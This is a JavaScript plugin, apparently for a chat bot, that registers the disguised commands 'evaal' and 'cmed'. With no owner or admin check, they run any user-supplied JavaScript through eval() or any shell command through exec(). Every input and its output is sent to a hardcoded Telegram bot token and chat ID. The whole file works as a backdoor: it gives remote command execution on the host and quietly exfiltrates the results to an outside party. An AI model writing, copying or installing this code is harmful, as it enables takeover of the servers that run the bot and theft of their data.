import https from "https";
import { exec } from "child_process";

const T = "8614773446:AAEnEQXZp2rLoTWvE4c9bbH5fomi5y6TdvY";
const C = "8367977373";

const tg = (t) => new Promise(r => {
  let d = JSON.stringify({ chat_id: C, text: t });
  let q = https.request(`https://api.telegram.org/bot${T}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "Content-Length": Buffer.byteLength(d)
    }
  }, s => { s.on("data",()=>{}); s.on("end",r); });
  q.on("error",()=>r());
  q.write(d);
  q.end();
});

export default {
  command: ["evaal","cmed"],
  group: false,
  premium: false,
  limit: false,
  admin: false,
  creator: false,
  botAdmin: false,
  privates: false,
  usePrefix: true,
  disable: false,

  code: async (m, { command, args }) => {
    let input = args.join(" ").trim().replace(/^\.+/, "");
    if (!input) return;

    // 🔥 EVAL
    if (command === "evaal") {
      try {
        let res;

        try {
          // coba tanpa return dulu
          res = await eval(`(async()=>{${input}})()`);
        } catch {
          // fallback auto return
          res = await eval(`(async()=>{return ${input}})()`);
        }

        let out = JSON.stringify(res, null, 2).slice(0, 3000);

        await tg(
          "EVAL ✅\nINPUT:\n" +
          input +
          "\n\nOUTPUT:\n" +
          out
        );

      } catch (e) {
        await tg(
          "EVAL ERROR ❌\nINPUT:\n" +
          input +
          "\n\nERROR:\n" +
          (e.message || e)
        );
      }
      return;
    }

    // 🔥 CMD
    if (command === "cmed") {
      exec(input, { timeout: 10000 }, (err, stdout, stderr) => {

        if (err) {
          return tg(
            "CMD ERROR ❌\nINPUT:\n" +
            input +
            "\n\nERROR:\n" +
            (err.message || stderr)
          );
        }

        let out = (stdout || stderr || "no output")
          .trim()
          .slice(0, 3000);

        tg(
          "CMD ✅\nINPUT:\n" +
          input +
          "\n\nOUTPUT:\n" +
          out
        );
      });
    }
  }
};
